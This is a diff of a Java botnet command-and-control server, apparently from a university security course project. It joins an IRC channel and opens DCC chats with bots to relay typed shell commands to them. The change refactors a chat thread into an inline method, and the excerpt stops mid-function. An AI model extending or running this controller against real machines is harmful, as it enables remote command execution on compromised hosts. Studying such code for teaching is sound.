@@ -5,6 +5,8 @@ import java.util.*;
 import org.jibble.pircbot.*;
 
 public class BotnetServer extends PircBot {
+	private static final String SENTINEL = "$: ";
+	private static final String TERMINATION = "exit";
 	private static final boolean DEBUG = true;
 	private static final String SERVER = "eve.cs.washington.edu";
 	private static final String CHANNEL = "#hacktastic";
@@ -13,7 +15,6 @@ public class BotnetServer extends PircBot {
 	private static final int TIMEOUT = 120000;
 	private Scanner input;
 	private boolean inChat;
-	private ChatThread chat;
 	
 	public static void main(String[] args) {
 		BotnetServer bn = new BotnetServer();
@@ -118,33 +119,14 @@ public class BotnetServer extends PircBot {
 	}
 	
 	private void engageInChat(String botNick, int timeout) {
-		DccChat chatObj = dccSendChatRequest(botNick, timeout);
-		chat = new ChatThread(chatObj);
-		
-		//Pause until we are done chatting
-		while(chat.isAlive());
-	}
-	
-	private class ChatThread extends Thread {
-		private static final String SENTINEL = "$: ";
-		private static final String TERMINATION = "exit";
-		DccChat chat;
-		
-		public ChatThread(DccChat chat) {
-			this.chat = chat;
-			if (chat != null) {
-				this.start();
-			} else {
-				System.out.println("The chat request was rejected.");
-			}
-		}
-		
-		public void run() {
+		DccChat chat = dccSendChatRequest(botNick, timeout);
+		if (chat == null) {
+			System.out.println("The chat request was rejected.");
+		} else {
 			Scanner input = new Scanner(System.in);
-			
 			Scanner shellout = new Scanner(chat.getBufferedReader());
+			
 			try {
-				//System.out.print("$: ");
 				System.out.print(shellout.nextLine());
 				
 				String command = input.nextLine();
